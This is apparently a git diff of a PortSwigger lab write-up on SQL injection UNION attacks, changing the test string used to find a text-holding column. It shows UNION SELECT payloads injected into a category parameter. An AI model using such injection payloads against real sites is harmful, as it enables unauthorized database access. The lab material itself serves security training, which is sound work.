@@ -23,20 +23,20 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
 ![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/bac817c2572779ad40b37b52f9460ec4e9d88934/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Retrieve%20String.png)
 
 
-We need to use the UNION SELECT payload  using 3 NULL values. Try thetring value *stydPI* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.
+We need to use the UNION SELECT payload  using 3 NULL values. Try the string value *HgP47P* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.
 
-**33eWHU in 1st NULL -**
+**HgP47P in 1st NULL -**
 
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'stydPI',NULL,NULL --
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'HgP47P',NULL,NULL --
 ```
 
 ![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7f66bfbd0766470932dd6663f3d1c95d123f4387/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%201st%20NULL%20value.png)
 
-**33eWHU in 2nd NULL -**
+**HgP47P in 2nd NULL -**
 
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'stydPI',NULL
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'HgP47P',NULL
 ```
 
 ![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/6471c88c947b4058c68f4e140230741ef5a36cc1/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%202nd%20NULL%20value.png)
